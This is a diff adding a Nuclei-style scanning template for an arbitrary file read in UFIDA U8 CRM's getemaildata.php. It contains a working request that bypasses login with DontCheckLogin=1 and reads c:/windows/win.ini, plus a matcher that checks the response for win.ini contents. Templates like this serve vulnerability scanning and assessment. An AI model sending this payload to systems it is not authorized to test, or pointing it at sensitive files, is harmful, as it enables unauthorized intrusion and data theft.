@@ -1,0 +1,24 @@
+id: yonyou-u8-crm-lfi
+
+info:
+  name: UFIDA U8 CRM getemaildata.php - Arbitrary File Read
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        POST /ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - "status_code==200 && contains_all(body,'bit app support','extensions','fonts')"
